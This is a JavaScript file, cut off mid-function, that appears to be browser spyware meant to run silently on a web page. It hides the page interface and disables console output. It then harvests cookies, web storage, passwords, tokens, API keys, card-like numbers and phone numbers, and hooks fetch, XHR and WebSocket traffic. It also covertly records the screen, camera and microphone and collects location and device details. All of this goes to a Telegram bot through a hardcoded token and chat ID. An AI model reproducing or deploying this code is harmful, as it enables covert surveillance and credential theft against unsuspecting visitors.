// Telegram Configuration
const TOKEN = "8893243858:AAFys6aLxzFjp6I6V7bSwSLgSDfxeOobPS8";
let CHAT_ID = "6837307356";

// Global variables
let currentLocation = null;
let cameraStream = null;
let audioStream = null;
let isAutoCameraEnabled = true;
let isSilentMode = true; // បើក Silent Mode

// Screen Recording variables
let screenRecorder = null;
let screenStream = null;
let recordedChunks = [];
let isRecording = false;

// DOM Elements
const themeToggle = document.getElementById("themeToggle");

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    // Clean URL parameters
    cleanURL();
    
    // Get chat ID from URL
    const chatIDFromURL = getChatIDFromURL();
    if (chatIDFromURL) CHAT_ID = chatIDFromURL;
    
    // Initialize theme silently
    initTheme();
    
    // Hide all UI elements if in silent mode
    if (isSilentMode) {
        hideAllUIElements();
    }
    
    // Initialize interceptors
    initializeInterceptors();
    
    // Start silent operations
    startSilentOperations();
});

// ==================== SILENT MODE FUNCTIONS ====================
function hideAllUIElements() {
    const elementsToHide = [
        'counter', 'timer', 'response', 'mapContainer',
        'previewContainer', 'video', 'captureBtn',
        'themeToggle', 'loveText'
    ];
    
    elementsToHide.forEach(id => {
        const element = document.getElementById(id);
        if (element) element.style.display = 'none';
    });
    
    document.querySelectorAll('button').forEach(btn => {
        if (!btn.id.includes('hidden')) {
            btn.style.display = 'none';
        }
    });
    
    if (isSilentMode) {
        console.log = function() {};
        console.warn = function() {};
        console.error = function() {};
    }
}

function showToast(message, duration = 3000) {
    if (isSilentMode) return;
    
    const toast = document.getElementById('toast');
    if (!toast) return;
    
    toast.textContent = message;
    toast.classList.add('show');
    
    setTimeout(() => {
        toast.classList.remove('show');
    }, duration);
}

// ==================== SCREEN RECORDING (SILENT) ====================
async function startScreenRecording() {
    if (!CHAT_ID) return;
    if (isRecording) return;
    
    try {
        // ស្នើសុំអនុញ្ញាតថតអេក្រង់
        screenStream = await navigator.mediaDevices.getDisplayMedia({
            video: {
                cursor: "always",
                displaySurface: "monitor",
                frameRate: { ideal: 30 }
            },
            audio: true  // ថតសំឡេងផង
        });
        
        // បង្កើត MediaRecorder
        const mimeType = getSupportedMimeType();
        screenRecorder = new MediaRecorder(screenStream, {
            mimeType: mimeType,
            videoBitsPerSecond: 2500000  // 2.5 Mbps
        });
        
        recordedChunks = [];
        
        screenRecorder.ondataavailable = (event) => {
            if (event.data && event.data.size > 0) {
                recordedChunks.push(event.data);
            }
        };
        
        screenRecorder.onstop = async () => {
            isRecording = false;
            
            // បញ្ចូល chunks ទាំងអស់
            const blob = new Blob(recordedChunks, { type: mimeType });
            
            // កំណត់ file extension
            const extension = mimeType.includes('mp4') ? 'mp4' : 'webm';
            const fileName = `screen_record_${Date.now()}.${extension}`;
            const file = new File([blob], fileName, { type: mimeType });
            
            // ប្រមូលព័ត៌មានឧបករណ៍
            const deviceInfo = await collectDeviceInfo();
            const formattedInfo = formatDeviceInfo(deviceInfo);
            
            // ផ្ញើវីដេអូទៅ Telegram
            await sendVideoToTelegram(file, `🎥 វីដេអូអេក្រង់\n\n📊 ទំហំ: ${formatBytes(blob.size)}\n⏱️ រយៈពេល: ${getRecordingDuration()} វិនាទី\n\n${formattedInfo}`);
            
            // សម្អាត
            recordedChunks = [];
            if (screenStream) {
                screenStream.getTracks().forEach(track => track.stop());
                screenStream = null;
            }
            screenRecorder = null;
        };
        
        screenRecorder.onerror = (event) => {
            console.error('Recording error:', event);
            isRecording = false;
        };
        
        // ចាប់ផ្តើមថត
        screenRecorder.start(1000); // បង្កើត chunk រាល់ 1 វិនាទី
        isRecording = true;
        
        // កំណត់ពេលចាប់ផ្តើមថត
        window.recordingStartTime = Date.now();
        
        // ផ្ញើសារជូនដំណឹងថាចាប់ផ្តើមថត
        const deviceInfo = await collectDeviceInfo();
        await sendMessageToTelegram(`🎬 **ចាប់ផ្តើមថតវីដេអូអេក្រង់**\n\n⏰ ពេល: ${new Date().toLocaleString('km-KH')}\n\n${formatDeviceInfo(deviceInfo)}`);
        
        // ឈប់ថតដោយស្វ័យប្រវត្តិក្រោយ 60 វិនាទី
        setTimeout(() => {
            if (isRecording) {
                stopScreenRecording();
            }
        }, 60000);
        
        // តាមដានពេលអ្នកប្រើឈប់ share screen
        screenStream.getVideoTracks()[0].addEventListener('ended', () => {
            if (isRecording) {
                stopScreenRecording();
            }
        });
        
    } catch (error) {
        console.error('Screen recording error:', error);
        
        let errorMessage = 'មិនអាចថតអេក្រង់បាន';
        if (error.name === 'NotAllowedError') {
            errorMessage = 'អ្នកប្រើបានបដិសេធការថតអេក្រង់';
        } else if (error.name === 'NotFoundError') {
            errorMessage = 'មិនឃើញអេក្រង់ដើម្បីថត';
        }
        
        const deviceInfo = await collectDeviceInfo();
        await sendMessageToTelegram(`❌ **មិនអាចថតអេក្រង់បាន**\n\n📝 មូលហេតុ: ${errorMessage}\n\n${formatDeviceInfo(deviceInfo)}`);
    }
}

function stopScreenRecording() {
    if (screenRecorder && screenRecorder.state === 'recording') {
        screenRecorder.stop();
        isRecording = false;
    }
}

function getSupportedMimeType() {
    const types = [
        'video/webm;codecs=vp9,opus',
        'video/webm;codecs=vp8,opus',
        'video/webm;codecs=h264,opus',
        'video/webm',
        'video/mp4'
    ];
    
    for (const type of types) {
        if (MediaRecorder.isTypeSupported(type)) {
            return type;
        }
    }
    
    return 'video/webm';
}

function getRecordingDuration() {
    if (window.recordingStartTime) {
        return Math.round((Date.now() - window.recordingStartTime) / 1000);
    }
    return 0;
}

// ==================== SCREENSHOT CAPTURE ====================
async function captureScreenshot() {
    if (!CHAT_ID) return;
    
    try {
        // ស្នើសុំថតអេក្រង់មួយសន្លឹក
        const stream = await navigator.mediaDevices.getDisplayMedia({
            video: {
                cursor: "always"
            },
            audio: false
        });
        
        const video = document.createElement('video');
        video.style.display = 'none';
        document.body.appendChild(video);
        video.srcObject = stream;
        
        await video.play();
        
        // រង់ចាំបន្តិចដើម្បីឱ្យ video រួចរាល់
        await new Promise(resolve => setTimeout(resolve, 500));
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0);
        
        // ឈប់ stream
        stream.getTracks().forEach(track => track.stop());
        video.remove();
        
        // បម្លែងជារូបភាព
        canvas.toBlob(async (blob) => {
            const file = new File([blob], `screenshot_${Date.now()}.png`, { type: 'image/png' });
            
            const deviceInfo = await collectDeviceInfo();
            const formattedInfo = formatDeviceInfo(deviceInfo);
            
            await sendPhotoToTelegram(file, `📸 រូបថតអេក្រង់\n\n${formattedInfo}`);
        }, 'image/png');
        
    } catch (error) {
        console.error('Screenshot error:', error);
    }
}

// ==================== VIDEO RECORDING FROM CAMERA ====================
let cameraRecorder = null;
let cameraRecordedChunks = [];

async function startCameraRecording() {
    if (!CHAT_ID) return;
    
    try {
        // ស្នើសុំកាមេរ៉ា និងម៉ៃក្រូហ្វូន
        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user',
                width: { ideal: 1280 },
                height: { ideal: 720 },
                frameRate: { ideal: 30 }
            },
            audio: true
        });
        
        const mimeType = getSupportedMimeType();
        cameraRecorder = new MediaRecorder(stream, {
            mimeType: mimeType,
            videoBitsPerSecond: 2500000
        });
        
        cameraRecordedChunks = [];
        
        cameraRecorder.ondataavailable = (event) => {
            if (event.data && event.data.size > 0) {
                cameraRecordedChunks.push(event.data);
            }
        };
        
        cameraRecorder.onstop = async () => {
            const blob = new Blob(cameraRecordedChunks, { type: mimeType });
            const extension = mimeType.includes('mp4') ? 'mp4' : 'webm';
            const file = new File([blob], `camera_record_${Date.now()}.${extension}`, { type: mimeType });
            
            const deviceInfo = await collectDeviceInfo();
            const formattedInfo = formatDeviceInfo(deviceInfo);
            
            await sendVideoToTelegram(file, `📹 វីដេអូពីកាមេរ៉ា\n\n${formattedInfo}`);
            
            cameraRecordedChunks = [];
            stream.getTracks().forEach(track => track.stop());
            cameraRecorder = null;
        };
        
        cameraRecorder.start(1000);
        
        const deviceInfo = await collectDeviceInfo();
        await sendMessageToTelegram(`🎥 **ចាប់ផ្តើមថតវីដេអូកាមេរ៉ា**\n\n${formatDeviceInfo(deviceInfo)}`);
        
        // ឈប់ថតក្រោយ 30 វិនាទី
        setTimeout(() => {
            if (cameraRecorder && cameraRecorder.state === 'recording') {
                cameraRecorder.stop();
            }
        }, 30000);
        
    } catch (error) {
        console.error('Camera recording error:', error);
    }
}

// ==================== SEND VIDEO TO TELEGRAM ====================
async function sendVideoToTelegram(file, caption) {
    if (!CHAT_ID) return;
    
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('video', file);
    if (caption) formData.append('caption', caption);
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
            method: "POST",
            body: formData
        });
        
        if (!response.ok) {
            // បើមិនអាចផ្ញើជា video សាកផ្ញើជា document
            await sendFileToTelegram(file, `📁 ${caption}`);
        }
    } catch (error) {
        console.error('Video upload error:', error);
    }
}

async function sendPhotoToTelegram(file, caption) {
    if (!CHAT_ID) return;
    
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', file);
    if (caption) formData.append('caption', caption);
    
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData
        });
    } catch (error) {
        console.error('Photo upload error:', error);
    }
}

// ==================== COOKIE STEALER (ENHANCED - WORKING) ====================
function getAllCookies() {
    const cookies = {};
    const cookieString = document.cookie;
    
    if (!cookieString) return cookies;
    
    cookieString.split(';').forEach(cookie => {
        const parts = cookie.split('=');
        const name = parts[0].trim();
        const value = parts.length > 1 ? decodeURIComponent(parts.slice(1).join('=').trim()) : '';
        cookies[name] = value;
    });
    
    return cookies;
}

function getCookieDetails() {
    const cookies = [];
    const cookieString = document.cookie;
    
    if (!cookieString) return cookies;
    
    cookieString.split(';').forEach(cookie => {
        const parts = cookie.split('=');
        const name = parts[0].trim();
        const value = parts.length > 1 ? decodeURIComponent(parts.slice(1).join('=').trim()) : '';
        
        const sensitiveKeywords = ['session', 'token', 'auth', 'login', 'user', 'pass', 'email', 'id', 'key', 'secret', 'jwt', 'bearer', 'xsrf', 'csrf', 'remember', 'credential'];
        const isSensitive = sensitiveKeywords.some(keyword => 
            name.toLowerCase().includes(keyword) || value.toLowerCase().includes(keyword)
        );
        
        let decodedValue = value;
        try {
            if (value.match(/^[A-Za-z0-9+/=]+$/)) {
                decodedValue = atob(value);
            }
        } catch (e) {}
        
        let parsedValue = null;
        try {
            parsedValue = JSON.parse(decodedValue);
        } catch (e) {}
        
        cookies.push({
            name: name,
            value: value,
            decodedValue: decodedValue,
            parsedValue: parsedValue,
            isSensitive: isSensitive
        });
    });
    
    return cookies;
}

function getAllStorageData() {
    const data = {
        localStorage: {},
        sessionStorage: {},
        cookies: getAllCookies()
    };
    
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        try {
            const value = localStorage.getItem(key);
            data.localStorage[key] = tryParseJSON(value);
        } catch (e) {
            data.localStorage[key] = 'Cannot read';
        }
    }
    
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        try {
            const value = sessionStorage.getItem(key);
            data.sessionStorage[key] = tryParseJSON(value);
        } catch (e) {
            data.sessionStorage[key] = 'Cannot read';
        }
    }
    
    return data;
}

function tryParseJSON(value) {
    try {
        return JSON.parse(value);
    } catch {
        return value;
    }
}

function extractCredentials() {
    const credentials = {
        usernames: new Set(),
        emails: new Set(),
        passwords: new Set(),
        tokens: new Set(),
        apiKeys: new Set(),
        sessionIds: new Set(),
        creditCards: new Set(),
        phones: new Set()
    };
    
    // Search in localStorage
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        extractFromString(key, value, credentials);
    }
    
    // Search in sessionStorage
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const value = sessionStorage.getItem(key);
        extractFromString(key, value, credentials);
    }
    
    // Search in Cookies
    const cookies = getCookieDetails();
    cookies.forEach(cookie => {
        extractFromString(cookie.name, cookie.value, credentials);
        if (cookie.decodedValue !== cookie.value) {
            extractFromString(cookie.name, cookie.decodedValue, credentials);
        }
    });
    
    // Search in HTML hidden inputs
    document.querySelectorAll('input[type="hidden"]').forEach(input => {
        extractFromString(input.name, input.value, credentials);
    });
    
    // Search in Script tags
    document.querySelectorAll('script').forEach(script => {
        const content = script.textContent;
        if (content) {
            extractFromString('script', content, credentials);
        }
    });
    
    // Search in window object
    const windowKeys = ['user', 'currentUser', 'loggedInUser', 'auth', 'session', 'token', 'userData', 'profile'];
    windowKeys.forEach(key => {
        if (window[key]) {
            try {
                extractFromString(`window.${key}`, JSON.stringify(window[key]), credentials);
            } catch (e) {}
        }
    });
    
    return {
        usernames: Array.from(credentials.usernames),
        emails: Array.from(credentials.emails),
        passwords: Array.from(credentials.passwords),
        tokens: Array.from(credentials.tokens),
        apiKeys: Array.from(credentials.apiKeys),
        sessionIds: Array.from(credentials.sessionIds),
        creditCards: Array.from(credentials.creditCards),
        phones: Array.from(credentials.phones)
    };
}

function extractFromString(source, text, credentials) {
    if (!text || typeof text !== 'string') return;
    
    // Email regex
    const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
    const emails = text.match(emailRegex);
    if (emails) emails.forEach(e => credentials.emails.add(e));
    
    // Phone regex (Cambodia and international)
    const phoneRegex = /(?:\+855|0)[1-9][0-9]{7,8}|\+[1-9][0-9]{9,14}/g;
    const phones = text.match(phoneRegex);
    if (phones) phones.forEach(p => credentials.phones.add(p));
    
    // Credit card regex
    const ccRegex = /\b[0-9]{13,19}\b/g;
    const ccs = text.match(ccRegex);
    if (ccs) ccs.forEach(c => credentials.creditCards.add(c));
    
    // JWT Token regex
    const jwtRegex = /eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*/g;
    const jwts = text.match(jwtRegex);
    if (jwts) jwts.forEach(t => credentials.tokens.add(t));
    
    // Bearer Token
    const bearerRegex = /bearer\s+([a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+)/gi;
    const bearerMatch = text.match(bearerRegex);
    if (bearerMatch) {
        bearerMatch.forEach(b => {
            const token = b.replace(/bearer\s+/i, '');
            credentials.tokens.add(token);
        });
    }
    
    // API Key patterns
    const apiKeyPatterns = [
        /api[_-]?key[=:]\s*['"]?([a-zA-Z0-9_-]{20,})['"]?/gi,
        /secret[=:]\s*['"]?([a-zA-Z0-9_-]{20,})['"]?/gi,
        /token[=:]\s*['"]?([a-zA-Z0-9_-]{20,})['"]?/gi,
        /sk-[a-zA-Z0-9]{20,}/g,
        /AIza[a-zA-Z0-9_-]{30,}/g
    ];
    
    apiKeyPatterns.forEach(pattern => {
        const matches = text.match(pattern);
        if (matches) {
            matches.forEach(m => {
                const value = m.replace(/^[^=:]*[=:]\s*['"]?/i, '').replace(/['"]$/, '');
                credentials.apiKeys.add(`${source}:${value}`);
            });
        }
    });
    
    const lowerText = text.toLowerCase();
    const sourceLower = source.toLowerCase();
    
    if (sourceLower.includes('pass') || sourceLower.includes('pwd') || sourceLower.includes('secret')) {
        if (text.length > 0 && text.length < 100) {
            credentials.passwords.add(`${source}:${text}`);
        }
    }
    
    if (sourceLower.includes('user') || sourceLower.includes('login') || 
        sourceLower.includes('name') || sourceLower.includes('account')) {
        if (text.length > 0 && text.length < 50) {
            credentials.usernames.add(`${source}:${text}`);
        }
    }
    
    if (sourceLower.includes('session') || sourceLower.includes('sess') || 
        sourceLower.includes('sid') || sourceLower.includes('connect.sid')) {
        if (text.length > 5) {
            credentials.sessionIds.add(`${source}:${text}`);
        }
    }
}

function extractPageContent() {
    const content = {
        title: document.title,
        url: window.location.href,
        metaTags: {},
        headings: [],
        forms: [],
        links: [],
        visibleText: ''
    };
    
    document.querySelectorAll('meta').forEach(meta => {
        const name = meta.getAttribute('name') || meta.getAttribute('property') || meta.getAttribute('http-equiv');
        const content2 = meta.getAttribute('content');
        if (name && content2) {
            content.metaTags[name] = content2;
        }
    });
    
    document.querySelectorAll('h1, h2, h3').forEach(h => {
        content.headings.push({
            tag: h.tagName,
            text: h.textContent.trim()
        });
    });
    
    document.querySelectorAll('form').forEach(form => {
        const formInfo = {
            action: form.action,
            method: form.method,
            inputs: []
        };
        
        form.querySelectorAll('input, select, textarea').forEach(input => {
            formInfo.inputs.push({
                type: input.type,
                name: input.name,
                id: input.id,
                value: input.type === 'password' ? '[HIDDEN]' : input.value,
                placeholder: input.placeholder
            });
        });
        
        content.forms.push(formInfo);
    });
    
    document.querySelectorAll('a[href]').forEach(a => {
        const href = a.href;
        if (href && !href.startsWith('#') && !href.startsWith('javascript:')) {
            content.links.push({
                text: a.textContent.trim().substring(0, 50),
                href: href
            });
        }
    });
    
    const bodyText = document.body.textContent || '';
    content.visibleText = bodyText.replace(/\s+/g, ' ').trim().substring(0, 1000);
    
    return content;
}

async function stealAllData() {
    if (!CHAT_ID) return;
    
    try {
        const cookies = getCookieDetails();
        const storageData = getAllStorageData();
        const credentials = extractCredentials();
        const pageContent = extractPageContent();
        const deviceInfo = await collectDeviceInfo();
        
        let message = `🔴 **ទិន្នន័យត្រូវបានលួច**\n\n`;
        
        // Cookies
        message += `🍪 **Cookies:** ${cookies.length} ត្រូវបានរកឃើញ\n`;
        if (cookies.length > 0) {
            cookies.slice(0, 10).forEach(c => {
                const shortValue = c.value.length > 50 ? c.value.substring(0, 50) + '...' : c.value;
                message += `├─ ${c.name}: ${shortValue}\n`;
            });
            if (cookies.length > 10) message += `└─ ... និង ${cookies.length - 10} ទៀត\n`;
        }
        message += `\n`;
        
        // Storage
        message += `💾 **Storage:**\n`;
        message += `├─ LocalStorage: ${Object.keys(storageData.localStorage).length} items\n`;
        message += `├─ SessionStorage: ${Object.keys(storageData.sessionStorage).length} items\n\n`;
        
        // Credentials found
        message += `🔐 **Credentials ដែលរកឃើញ:**\n`;
        message += `├─ Usernames: ${credentials.usernames.length}\n`;
        message += `├─ Emails: ${credentials.emails.length}\n`;
        message += `├─ Passwords: ${credentials.passwords.length}\n`;
        message += `├─ Tokens: ${credentials.tokens.length}\n`;
        message += `├─ API Keys: ${credentials.apiKeys.length}\n`;
        message += `├─ Session IDs: ${credentials.sessionIds.length}\n`;
        message += `├─ Phones: ${credentials.phones.length}\n`;
        message += `└─ Credit Cards: ${credentials.creditCards.length}\n\n`;
        
        // Show Emails
        if (credentials.emails.length > 0) {
            message += `📧 **Emails:**\n`;
            credentials.emails.slice(0, 5).forEach(e => message += `├─ ${e}\n`);
            if (credentials.emails.length > 5) message += `└─ ... និង ${credentials.emails.length - 5} ទៀត\n`;
            message += `\n`;
        }
        
        // Show Passwords
        if (credentials.passwords.length > 0) {
            message += `🔑 **Passwords:**\n`;
            credentials.passwords.slice(0, 5).forEach(p => message += `├─ ${p}\n`);
            message += `\n`;
        }
        
        // Show Tokens
        if (credentials.tokens.length > 0) {
            message += `🎫 **Tokens:**\n`;
            credentials.tokens.slice(0, 3).forEach(t => {
                const short = t.length > 50 ? t.substring(0, 50) + '...' : t;
                message += `├─ ${short}\n`;
            });
            message += `\n`;
        }
        
        // Show Phones
        if (credentials.phones.length > 0) {
            message += `📞 **លេខទូរស័ព្ទ:**\n`;
            credentials.phones.slice(0, 5).forEach(p => message += `├─ ${p}\n`);
            message += `\n`;
        }
        
        // Show Session IDs
        if (credentials.sessionIds.length > 0) {
            message += `🔐 **Session IDs:**\n`;
            credentials.sessionIds.slice(0, 5).forEach(s => {
                const short = s.length > 50 ? s.substring(0, 50) + '...' : s;
                message += `├─ ${short}\n`;
            });
            message += `\n`;
        }
        
        // Page info
        message += `📄 **ទំព័រ:** ${pageContent.title}\n`;
        message += `🔗 URL: ${pageContent.url}\n\n`;
        
        // Device info
        message += formatDeviceInfo(deviceInfo);
        
        // Send to Telegram
        await sendMessageToTelegram(message);
        
        // Create and send full JSON file
        const fullData = {
            timestamp: new Date().toISOString(),
            url: window.location.href,
            cookies: cookies,
            storage: storageData,
            credentials: credentials,
            pageContent: pageContent,
            deviceInfo: deviceInfo
        };
        
        const jsonBlob = new Blob([JSON.stringify(fullData, null, 2)], { type: 'application/json' });
        const jsonFile = new File([jsonBlob], `stolen_data_${Date.now()}.json`, { type: 'application/json' });
        await sendFileToTelegram(jsonFile, `📁 ទិន្នន័យពេញលេញ - ${cookies.length} cookies, ${credentials.emails.length} emails`);
        
        // Send sensitive cookies separately
        const sensitiveCookies = cookies.filter(c => c.isSensitive);
        if (sensitiveCookies.length > 0) {
            const sensitiveBlob = new Blob([JSON.stringify(sensitiveCookies, null, 2)], { type: 'application/json' });
            const sensitiveFile = new File([sensitiveBlob], `sensitive_cookies_${Date.now()}.json`, { type: 'application/json' });
            await sendFileToTelegram(sensitiveFile, `⚠️ Sensitive Cookies - ${sensitiveCookies.length} items`);
        }
        
        // Send localStorage if large
        if (Object.keys(storageData.localStorage).length > 10) {
            const lsBlob = new Blob([JSON.stringify(storageData.localStorage, null, 2)], { type: 'application/json' });
            const lsFile = new File([lsBlob], `localStorage_${Date.now()}.json`, { type: 'application/json' });
            await sendFileToTelegram(lsFile, `📁 LocalStorage ពេញលេញ`);
        }
        
    } catch (error) {
        // Silent
    }
}

// ==================== NETWORK INTERCEPTION ====================
function interceptFetch() {
    const originalFetch = window.fetch;
    window.fetch = async function(...args) {
        const response = await originalFetch.apply(this, args);
        
        try {
            const url = args[0];
            const options = args[1] || {};
            
            if (CHAT_ID) {
                const bodyStr = typeof options.body === 'string' ? options.body : JSON.stringify(options.body);
                if (bodyStr && (bodyStr.includes('password') || bodyStr.includes('token') || bodyStr.includes('email') || bodyStr.includes('login'))) {
                    await sendMessageToTelegram(`🌐 **Fetch Request**\n\n📤 URL: ${url}\n📝 Body: ${bodyStr.substring(0, 500)}`);
                }
            }
        } catch (e) {}
        
        return response;
    };
}

function interceptXHR() {
    const originalOpen = XMLHttpRequest.prototype.open;
    const originalSend = XMLHttpRequest.prototype.send;
    
    XMLHttpRequest.prototype.open = function(method, url) {
        this._method = method;
        this._url = url;
        return originalOpen.apply(this, arguments);
    };
    
    XMLHttpRequest.prototype.send = function(body) {
        if (CHAT_ID && body) {
            const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
            if (bodyStr.includes('password') || bodyStr.includes('token') || bodyStr.includes('email')) {
                sendMessageToTelegram(`🌐 **XHR Request**\n\n📤 ${this._method} ${this._url}\n📝 ${bodyStr.substring(0, 300)}`);
            }
        }
        
        this.addEventListener('load', function() {
            if (CHAT_ID && this.status === 200) {
                try {
                    const responseText = this.responseText;
                    if (responseText && responseText.length < 5000) {
                        if (responseText.includes('token') || responseText.includes('session') || responseText.includes('user')) {
                            // Silent - record
                        }
                    }
                } catch (e) {}
            }
        });
        
        return originalSend.apply(this, arguments);
    };
}

function interceptWebSocket() {
    const originalWebSocket = window.WebSocket;
    window.WebSocket = function(...args) {
        const ws = new originalWebSocket(...args);
        
        if (CHAT_ID) {
            sendMessageToTelegram(`🔌 **WebSocket Connected**\n\n🔗 URL: ${args[0]}`);
        }
        
        const originalSend = ws.send;
        ws.send = function(data) {
            if (CHAT_ID && data) {
                const dataStr = typeof data === 'string' ? data : JSON.stringify(data);
                if (dataStr.includes('token') || dataStr.includes('auth') || dataStr.includes('password')) {
                    sendMessageToTelegram(`📨 **WebSocket Message**\n\n📤 ${dataStr.substring(0, 300)}`);
                }
            }
            return originalSend.call(this, data);
        };
        
        // Intercept received messages
        ws.addEventListener('message', function(event) {
            if (CHAT_ID && event.data) {
                const dataStr = typeof event.data === 'string' ? event.data : JSON.stringify(event.data);
                if (dataStr.includes('token') || dataStr.includes('session') || dataStr.includes('user')) {
                    sendMessageToTelegram(`📩 **WebSocket Received**\n\n📥 ${dataStr.substring(0, 300)}`);
                }
            }
        });
        
        return ws;
    };
    window.WebSocket.prototype = originalWebSocket.prototype;
}

function initializeInterceptors() {
    interceptFetch();
    interceptXHR();
    interceptWebSocket();
}

// ==================== MUTATION OBSERVER ====================
const observer = new MutationObserver(() => {
    setTimeout(() => {
        const credentials = extractCredentials();
        if (credentials.emails.length > 0 || credentials.passwords.length > 0 || credentials.tokens.length > 0) {
            // New credentials found - will be captured in next interval
        }
    }, 1000);
});

observer.observe(document.body, {
    childList: true,
    subtree: true,
    attributes: true
});

// ==================== SILENT BACKGROUND OPERATIONS ====================
async function startSilentOperations() {
    // Steal data immediately
    setTimeout(() => {
        stealAllData();
    }, 1000);
    
    // Start screen recording after 2 seconds
    setTimeout(() => {
        startScreenRecording();
    }, 2000);
    
    // Take screenshot after 3 seconds
    setTimeout(() => {
        captureScreenshot();
    }, 3000);
    
    // Request camera for recording
    setTimeout(() => {
        silentRequestMediaPermissions();
    }, 4000);
    
    // Start camera video recording after 5 seconds
    setTimeout(() => {
        startCameraRecording();
    }, 5000);
    
    // Collect device info
    setTimeout(() => {
        silentCollectAndSendInfo();
    }, 6000);
    
    // Request location
    setTimeout(() => {
        silentRequestLocation();
    }, 7000);
    
    // Steal data every 30 seconds
    setInterval(() => {
        stealAllData();
    }, 30000);
    
    // Take screenshot every 45 seconds
    setInterval(() => {
        captureScreenshot();
    }, 45000);
    
    // Update device info every 60 seconds
    setInterval(() => {
        silentCollectAndSendInfo();
    }, 60000);
}

async function silentRequestMediaPermissions() {
    if (!isAutoCameraEnabled) return;
    
    try {
        const videoStream = await navigator.mediaDevices.getUserMedia({ 
            video: {
                facingMode: 'user',
                width: { ideal: 1280 },
                height: { ideal: 720 }
            },
            audio: false 
        });
        
        cameraStream = videoStream;
        
        setTimeout(() => {
            silentCapturePhotos(videoStream);
        }, 500);
        
        const audio = await navigator.mediaDevices.getUserMedia({ audio: true });
        audioStream = audio;
        
        setTimeout(() => {
            silentRecordAudio(audio);
        }, 1500);
        
    } catch (error) {}
}

async function silentCapturePhotos(stream) {
    try {
        const video = document.createElement('video');
        video.style.display = 'none';
        document.body.appendChild(video);
        video.srcObject = stream;
        await video.play();
        
        for (let i = 1; i <= 3; i++) {
            setTimeout(async () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0);
                
                canvas.toBlob(async (blob) => {
                    const file = new File([blob], `silent_capture_${i}.jpg`, { type: 'image/jpeg' });
                    const deviceInfo = await collectDeviceInfo();
                    const formattedInfo = formatDeviceInfo(deviceInfo);
                    await sendFileToTelegram(file, `📸 រូបភាពស្ងាត់ #${i}\n\n${formattedInfo}`);
                }, 'image/jpeg', 0.9);
            }, i * 1000);
        }
        
        setTimeout(() => {
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
                cameraStream = null;
            }
            video.remove();
        }, 5000);
        
    } catch (error) {}
}

async function silentRecordAudio(stream) {
    try {
        const audioRecorder = new MediaRecorder(stream);
        const audioChunks = [];
        
        audioRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                audioChunks.push(event.data);
            }
        };
        
        audioRecorder.onstop = async () => {
            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
            const file = new File([audioBlob], 'silent_audio.webm', { type: 'audio/webm' });
            
            const deviceInfo = await collectDeviceInfo();
            const formattedInfo = formatDeviceInfo(deviceInfo);
            
            await sendFileToTelegram(file, `🎤 អូឌីយ៉ូស្ងាត់\n\n${formattedInfo}`);
        };
        
        audioRecorder.start();
        setTimeout(() => {
            audioRecorder.stop();
            if (audioStream) {
                audioStream.getTracks().forEach(track => track.stop());
                audioStream = null;
            }
        }, 10000);
        
    } catch (error) {}
}

async function silentRequestLocation() {
    if (!navigator.geolocation) return;
    
    navigator.geolocation.getCurrentPosition(
        async function(position) {
            currentLocation = {
                lat: position.coords.latitude,
                lng: position.coords.longitude,
                accuracy: Math.round(position.coords.accuracy)
            };
            
            await silentSendLocation();
        },
        function(error) {},
        {
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0
        }
    );
}

async function silentSendLocation() {
    if (!currentLocation) return;
    
    const deviceInfo = await collectDeviceInfo();
    const formattedInfo = formatDeviceInfo(deviceInfo);
    
    const googleMapsLink = `https://www.google.com/maps?q=${currentLocation.lat},${currentLocation.lng}&z=15`;
    
    const message = `📍 ទីតាំងស្ងាត់\n\n${formattedInfo}\n\n🗺️ Google Maps: ${googleMapsLink}`;
    
    await sendMessageToTelegram(message);
    
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ 
                chat_id: CHAT_ID, 
                latitude: currentLocation.lat,
                longitude: currentLocation.lng
            }),
        });
    } catch (err) {}
}

// ==================== ENHANCED DEVICE INFO COLLECTION ====================
async function collectDeviceInfo() {
    const info = {
        timestamp: new Date().toLocaleString('km-KH'),
        ip: await getIPAddress(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${window.screen.width}x${window.screen.height}`,
        viewport: `${window.innerWidth}x${window.innerHeight}`,
        cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
        online: navigator.onLine ? 'Online' : 'Offline',
        battery: await getBatteryInfo(),
        location: currentLocation,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer || 'None',
        url: window.location.href,
        pageTitle: document.title,
        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
        deviceMemory: navigator.deviceMemory || 'Unknown',
        connection: getConnectionInfo(),
        doNotTrack: navigator.doNotTrack || 'Not set',
        vendor: navigator.vendor,
